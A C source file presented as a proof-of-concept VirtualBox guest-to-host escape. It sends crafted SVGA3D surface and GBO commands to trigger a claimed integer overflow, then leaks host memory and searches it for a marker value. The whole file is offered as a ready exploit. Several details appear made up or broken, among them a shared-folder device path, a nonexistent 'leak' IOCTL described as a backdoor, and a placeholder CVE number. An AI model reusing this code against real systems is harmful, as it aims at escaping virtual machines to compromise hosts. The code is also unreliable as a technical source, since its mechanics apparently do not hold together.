/* 
 * PoC for Oracle VM VirtualBox VM escape via VGA device
 * GHSA-qx2m-rcpc-v43v / CVE-2025-XXXXX
 * Integer overflow in vmsvga3dSurfaceMipBufferSize
 * Highly commented, compiled with mingw-w64 or MSVC.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <VBoxSvgaDevice.h>  // VirtualBox SVGA3D headers from SDK

#define DEVICE_NAME "\\\\.\\VBoxMiniRdrDN\\Svga"

/* Eggs and magic values */
static const uint32_t EGG_VALUE = 0x1421337;  
static const int ATTEMPTS = 10;

/* Helper to open handle to the SVGA device */
HANDLE open_svga() {
    HANDLE h = CreateFileA(DEVICE_NAME,
                          GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        perror("CreateFile");
        exit(1);
    }
    return h;
}

/* Build a "buggy_surface" command that allocates 0 bytes */
void build_buggy_surface(SVGA3dCmdHeader *hdr) {
    hdr->id = SVGA_3D_CMD_SURFACE_DEFINE_MIPLEVEL; 
    hdr->size = sizeof(SVGA3dCmdDefineSurfaceMipLevel);
    SVGA3dCmdDefineSurfaceMipLevel *cmd = (void*)(hdr + 1);
    cmd->surfaceId = 0x1337;
    cmd->mipLevel = 0;
    cmd->rowPitch = 0;           // causes integer overflow in cbTotal
    cmd->depthPitch = 0;
    cmd->face = 0;
    cmd->mipPitch = 0;  
}

/* Build a GBO allocation with our EGG_VALUE in cbTotal */
void build_egg_gbo(SVGA3dCmdHeader *hdr) {
    hdr->id = SVGA_3D_CMD_GB_OBJECT_DEFINE;
    hdr->size = sizeof(SVGA3dCmdGBODefine);
    SVGA3dCmdGBODefine *cmd = (void*)(hdr + 1);
    cmd->gboId = 0x2000;
    cmd->flags = SVGA_GBO_F_HOST_BACKED;
    cmd->totalPages = (EGG_VALUE + 0xFFF) >> 12; 
    cmd->cbTotal = EGG_VALUE;   
}

/* Read out-of-bounds memory via linear read primitive */
void leak_and_search(HANDLE h, uint8_t *buffer, SIZE_T size) {
    DWORD bytes;
    // Read using DeviceIoControl backdoor
    if (!DeviceIoControl(h, SVGA_3D_IOCTL_LEAK, NULL, 0,
                         buffer, size, &bytes, NULL)) {
        perror("DeviceIoControl leak");
        exit(1);
    }
    // Scan for EGG_VALUE
    for (int i = 0; i < size - 4; i++) {
        if (*(uint32_t*)(buffer + i) == EGG_VALUE) {
            printf("[+] Found egg at offset: 0x%x\n", i);
            return;
        }
    }
    printf("[-] Egg not found this round\n");
}

int main() {
    HANDLE h = open_svga();
    SVGA3dCmdHeader *hdr;
    uint8_t *buf = malloc(0x10000);
    for (int i = 0; i < ATTEMPTS; i++) {
        // 1) Trigger buggy surface
        hdr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        build_buggy_surface(hdr);
        DeviceIoControl(h, SVGA_3D_IOCTL_CMDEXECBUFFER, hdr, hdr->size, NULL, 0, NULL, NULL);

        // 2) Allocate our GBO with egg
        build_egg_gbo(hdr);
        VirtualLock(hdr, hdr->size);
        DeviceIoControl(h, SVGA_3D_IOCTL_CMDEXECBUFFER, hdr, hdr->size, NULL, 0, NULL, NULL);

        // 3) Leak memory and search for egg
        leak_and_search(h, buf, 0x10000);
    }
    return 0;
}